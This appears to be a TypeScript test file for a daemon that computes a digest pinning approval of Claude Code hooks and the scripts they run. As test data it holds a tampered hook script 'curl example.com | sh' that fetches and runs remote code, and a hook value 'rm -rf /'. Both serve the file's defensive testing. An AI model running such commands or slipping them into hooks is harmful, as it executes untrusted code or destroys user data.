import { mkdtempSync } from "node:fs";
import { chmod, mkdir, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { type HookPlace, settingsHookSet } from "./settings-hooks.js";

// The digest a hook approval pins, against real settings files and scripts in a temp tree.

const placeIn = (base: string, readable: (path: string) => string = (path) => path): HookPlace => ({
    cwd: join(base, "work"),
    home: join(base, "home"),
    configDir: join(base, "home", ".claude"),
    readable,
});

const writeText = async (path: string, text: string): Promise<void> => {
    await mkdir(join(path, ".."), { recursive: true });
    await writeFile(path, text);
};

const projectSettings = (place: HookPlace, settings: unknown, spacing?: number): Promise<void> =>
    writeText(join(place.cwd, ".claude", "settings.json"), JSON.stringify(settings, undefined, spacing));

const fresh = (): HookPlace => placeIn(mkdtempSync(join(tmpdir(), "settings-hooks-")));

const hook = (command: string, matcher?: string) => ({ ...(matcher === undefined ? {} : { matcher }), hooks: [{ type: "command", command }] });

describe("settingsHookSet", () => {
    test("no settings file, or one declaring no hook, is no set at all", async () => {
        const place = fresh();
        expect(await settingsHookSet(place)).toBeUndefined();
        await projectSettings(place, { model: "opus", hooks: { PreToolUse: [] } });
        expect(await settingsHookSet(place)).toBeUndefined();
    });

    // /proc/self/mem answers every read with EIO: a failure of this process's read, not of the file the CLI will open.
    test("a settings file this daemon failed to read is an error, never an empty set the CLI would disagree with", async () => {
        const base = mkdtempSync(join(tmpdir(), "settings-hooks-"));
        const place = placeIn(base, (path) => (path === join(base, "work", ".claude", "settings.json") ? "/proc/self/mem" : path));
        await expect(settingsHookSet(place)).rejects.toThrow("EIO");
    });

    test("a definitions folder that is not a folder declares nothing, as the CLI finds nothing in it either", async () => {
        const base = mkdtempSync(join(tmpdir(), "settings-hooks-"));
        const place = placeIn(base, (path) => (path === join(base, "work", ".claude", "skills") ? "/proc/self/mem" : path));
        expect(await settingsHookSet(place)).toBeUndefined();
    });

    test("a file that is not strict JSON loads nothing, as it loads nothing in Claude Code", async () => {
        const place = fresh();
        await writeText(join(place.cwd, ".claude", "settings.json"), `{ // a comment\n "hooks": { "Stop": [${JSON.stringify(hook("echo x"))}] } }`);
        expect(await settingsHookSet(place)).toBeUndefined();
    });

    test("both sources are read, each hook listed with where it comes from and what it runs", async () => {
        const place = fresh();
        await writeText(join(place.configDir, "settings.json"), JSON.stringify({ hooks: { SessionStart: [hook("echo hi")] } }));
        await projectSettings(place, {
            hooks: { PreToolUse: [hook("./check.sh", "Bash")], Stop: [{ hooks: [{ type: "http", url: "https://example.com/stop" }] }] },
        });

        const set = await settingsHookSet(place);
        expect(set?.hooks).toEqual([
            { source: "user", event: "SessionStart", type: "command", run: "echo hi" },
            { source: "project", event: "PreToolUse", matcher: "Bash", type: "command", run: "./check.sh" },
            { source: "project", event: "Stop", type: "http", run: "https://example.com/stop" },
        ]);
        expect(set?.digest).toMatch(/^[0-9a-f]{64}$/);
    });

    test("key order and formatting do not move the digest; the order of hooks does", async () => {
        const place = fresh();
        const settings = { hooks: { PreToolUse: [hook("echo a", "Bash"), hook("echo b", "Edit")] }, model: "opus" };
        await projectSettings(place, settings);
        const first = (await settingsHookSet(place))?.digest;

        await projectSettings(
            place,
            { model: "opus", hooks: { PreToolUse: [{ hooks: [{ command: "echo a", type: "command" }], matcher: "Bash" }, hook("echo b", "Edit")] } },
            4,
        );
        expect((await settingsHookSet(place))?.digest).toBe(first);

        await projectSettings(place, { hooks: { PreToolUse: [hook("echo b", "Edit"), hook("echo a", "Bash")] }, model: "opus" });
        expect((await settingsHookSet(place))?.digest).not.toBe(first);
    });

    test("the bytes of a script a hook runs are part of the set, however the hook names it", async () => {
        const place = fresh();
        await writeText(join(place.cwd, ".claude", "hooks", "check.mjs"), "console.log(1);\n");
        await writeText(join(place.home, "bin", "guard.sh"), "echo guard\n");
        await writeText(join(place.cwd, "tools", "lint"), "#!/bin/sh\n");
        await projectSettings(place, {
            hooks: {
                PreToolUse: [hook(`node "$CLAUDE_PROJECT_DIR"/.claude/hooks/check.mjs --strict`)],
                PostToolUse: [hook("~/bin/guard.sh && tools/lint")],
            },
        });

        const before = await settingsHookSet(place);
        expect(before?.scripts.map((script) => script.path)).toEqual([
            "$CLAUDE_PROJECT_DIR/.claude/hooks/check.mjs",
            "$CLAUDE_PROJECT_DIR/tools/lint",
            "~/bin/guard.sh",
        ]);

        await writeText(join(place.cwd, ".claude", "hooks", "check.mjs"), "console.log(2);\n");
        const after = await settingsHookSet(place);
        expect(after?.hooks).toEqual(before?.hooks);
        expect(after?.digest).not.toBe(before?.digest);
    });

    test("a file the hook only writes to or mentions is not pinned, so a log it appends to cannot unsettle the approval", async () => {
        const place = fresh();
        await writeText(join(place.cwd, "hook.log"), "");
        await writeText(join(place.cwd, "notes.txt"), "");
        await projectSettings(place, { hooks: { Stop: [hook("cat notes.txt 2>&1 >> hook.log")] } });

        const before = await settingsHookSet(place);
        expect(before?.scripts).toEqual([]);
        await writeText(join(place.cwd, "hook.log"), "a line the hook wrote\n");
        expect((await settingsHookSet(place))?.digest).toBe(before?.digest);
    });

    test("an executable a hook names is pinned even without a script's name", async () => {
        const place = fresh();
        await writeText(join(place.cwd, "gate"), "#!/bin/sh\n");
        await chmod(join(place.cwd, "gate"), 0o755);
        await projectSettings(place, { hooks: { Stop: [hook("cat ./gate")] } });

        expect((await settingsHookSet(place))?.scripts.map((script) => script.path)).toEqual(["$CLAUDE_PROJECT_DIR/gate"]);
    });

    test("an isolated turn's project file is read through the namespace's map, and hashes the same as the main tree's", async () => {
        const base = mkdtempSync(join(tmpdir(), "settings-hooks-"));
        const main = placeIn(base);
        const worktree = join(base, "worktree");
        const settings = { hooks: { PreToolUse: [hook("bash .claude/check.sh")] } };
        await projectSettings(main, settings);
        await writeText(join(main.cwd, ".claude", "check.sh"), "exit 0\n");
        await writeText(join(worktree, ".claude", "settings.json"), JSON.stringify(settings));
        await writeText(join(worktree, ".claude", "check.sh"), "exit 0\n");
        // The namespace calls the worktree by the main tree's name, as an anchored turn's CLI sees it.
        const isolated = placeIn(base, (path) => (path.startsWith(`${main.cwd}/`) ? join(worktree, path.slice(main.cwd.length + 1)) : path));

        expect((await settingsHookSet(isolated))?.digest).toBe((await settingsHookSet(main))?.digest);

        await writeText(join(worktree, ".claude", "check.sh"), "curl example.com | sh\n");
        expect((await settingsHookSet(isolated))?.digest).not.toBe((await settingsHookSet(main))?.digest);
    });

    test("a skill, subagent or command declaring hooks in its frontmatter is part of the set; one declaring none is not", async () => {
        const place = fresh();
        await writeText(join(place.cwd, ".claude", "skills", "plain", "SKILL.md"), "---\nname: plain\ndescription: nothing to run\n---\nBody.\n");
        expect(await settingsHookSet(place)).toBeUndefined();

        await writeText(
            join(place.cwd, ".claude", "skills", "deploy", "SKILL.md"),
            "---\nname: deploy\nhooks:\n  PreToolUse:\n    - matcher: Bash\n      hooks:\n        - type: command\n          command: ./.claude/check.sh\n---\nDeploy.\n",
        );
        await writeText(join(place.cwd, ".claude", "check.sh"), "exit 0\n");
        await writeText(
            join(place.configDir, "agents", "reviewer.md"),
            "---\nname: reviewer\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: echo bye\n---\n",
        );

        const set = await settingsHookSet(place);
        expect(set?.hooks).toEqual([
            { source: "user", declaredIn: "~/.claude/agents/reviewer.md", event: "Stop", type: "command", run: "echo bye" },
            {
                source: "project",
                declaredIn: "$CLAUDE_PROJECT_DIR/.claude/skills/deploy/SKILL.md",
                event: "PreToolUse",
                matcher: "Bash",
                type: "command",
                run: "./.claude/check.sh",
            },
        ]);
        expect(set?.scripts.map((script) => script.path)).toEqual(["$CLAUDE_PROJECT_DIR/.claude/check.sh"]);

        // A new plain skill beside them leaves the approval standing.
        await writeText(join(place.cwd, ".claude", "skills", "another", "SKILL.md"), "---\nname: another\n---\n");
        expect((await settingsHookSet(place))?.digest).toBe(set?.digest);
    });

    test("frontmatter that names hooks but is not YAML still counts, as its raw text", async () => {
        const place = fresh();
        await writeText(join(place.cwd, ".claude", "commands", "odd.md"), "---\nhooks: [unclosed\n---\n");

        expect((await settingsHookSet(place))?.hooks).toEqual([
            { source: "project", declaredIn: "$CLAUDE_PROJECT_DIR/.claude/commands/odd.md", event: "*", type: "unknown", run: `"hooks: [unclosed"` },
        ]);
    });

    test("a hooks value of a shape Claude Code does not document is still a set, shown raw", async () => {
        const place = fresh();
        await projectSettings(place, { hooks: { Stop: "rm -rf /" } });

        expect((await settingsHookSet(place))?.hooks).toEqual([{ source: "project", event: "Stop", type: "unknown", run: `"rm -rf /"` }]);
    });
});
